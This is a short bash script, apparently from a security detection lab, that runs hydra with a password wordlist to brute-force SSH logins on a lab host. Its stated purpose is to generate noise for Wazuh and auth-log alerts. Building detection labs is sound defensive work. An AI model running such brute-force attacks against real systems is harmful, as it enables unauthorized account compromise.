#!/usr/bin/env bash
# SSH brute force against the victim-ssh target. Generates auth.log noise for detection.
# Usage: ./attack_ssh_bruteforce.sh [target_host] [username]
set -euo pipefail
TARGET="${1:-victim-ssh}"
USER="${2:-labuser}"
WL="/opt/attacks/wordlists/passwords.txt"
echo "[*] Brute forcing ssh://$USER@$TARGET (port 2222 inside the SSH container is 22)"
echo "[*] This is loud on purpose - go watch Wazuh / the auth log."
hydra -l "$USER" -P "$WL" -t 4 -f -V "$TARGET" ssh || true
echo "[*] Done. Check the target's auth log and Wazuh alerts (SSH brute force = rule ~5710/5712)."
